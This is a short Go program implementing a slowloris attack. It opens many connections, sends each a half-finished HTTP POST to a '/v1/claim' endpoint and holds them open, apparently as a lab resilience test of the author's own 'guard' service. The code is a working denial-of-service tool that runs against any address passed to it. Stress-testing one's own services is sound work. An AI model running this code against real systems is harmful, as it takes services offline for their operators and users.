// slowloris opens many half-sent requests to the guard's API and holds them
// (lab only): the guard must stay up and answer again afterwards.
//
//	slowloris ADDR CONNS SECONDS
package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

func main() {
	n, _ := strconv.Atoi(os.Args[2])
	secs, _ := strconv.Atoi(os.Args[3])
	var conns []net.Conn
	for i := 0; i < n; i++ {
		c, err := net.DialTimeout("tcp", os.Args[1], 2*time.Second)
		if err != nil {
			continue
		}
		fmt.Fprintf(c, "POST /v1/claim HTTP/1.1\r\nHost: g\r\nAuthorization: Bearer x\r\nContent-Length: 4000\r\n\r\n{")
		conns = append(conns, c)
	}
	fmt.Println("open:", len(conns))
	time.Sleep(time.Duration(secs) * time.Second)
}
